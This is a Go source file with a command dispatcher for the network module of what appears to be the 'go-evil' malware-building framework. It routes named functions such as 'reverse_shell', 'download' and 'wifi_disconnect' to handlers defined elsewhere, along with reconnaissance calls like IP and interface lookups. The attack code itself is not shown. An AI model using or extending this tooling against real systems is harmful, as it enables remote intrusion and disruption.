package network

import (
	"fmt"

	"github.com/s9rA16Bf4/go-evil/domains/network/dns"
	"github.com/s9rA16Bf4/go-evil/domains/network/download"
	"github.com/s9rA16Bf4/go-evil/domains/network/interfaces"
	"github.com/s9rA16Bf4/go-evil/domains/network/ip"
	"github.com/s9rA16Bf4/go-evil/domains/network/network"
	"github.com/s9rA16Bf4/go-evil/utility/structure/json"

	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

func Parser(function string, value string, data_object *json.Json_t) []string {
	call := []string{}

	switch function {
	case "ping":
		call = network.Ping(value, data_object)

	case "get_local_ip":
		call = ip.Get_local(value, data_object)

	case "get_global_ip":
		call = ip.Get_global(value, data_object)

	case "get_interface":
		call = interfaces.Get_interface(value, data_object)

	case "get_interfaces":
		call = interfaces.Get_interfaces(value, data_object)

	case "get_networks":
		call = network.Get(value, data_object)

	case "reverse_shell":
		call = network.Reverse_shell(value, data_object)

	case "download":
		call = download.Download(value, data_object)

	case "dns_lookup":
		call = dns.Lookup(value, data_object)

	case "wifi_disconnect":
		call = network.Wifi_disconnect(value, data_object)

	default:
		notify.Error(fmt.Sprintf("Unknown function '%s'", function), "network.Parser()")

	}

	return call
}
